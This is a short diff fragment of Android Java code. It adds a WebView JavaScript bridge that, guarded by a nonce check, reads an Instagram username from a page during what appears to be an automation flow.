             uiHandler.post(new Runnable() {
                 @Override
                 public void run() {
                     clearAutomationNotification();
+                }
+            });
+        }
+    }
+
+    // Instagram page se sirf username lene ke liye (nonce ke bina kaam nahi karta)
+    public class IgProbeInterface {
+        @JavascriptInterface
+        public void onIgInfo(final String nonce, final String username) {
+            uiHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    if (captureBusy && nonce != null && nonce.equals(captureNonce)) {
+                        finishCapture(username);
+                    }
                 }
             });
         }
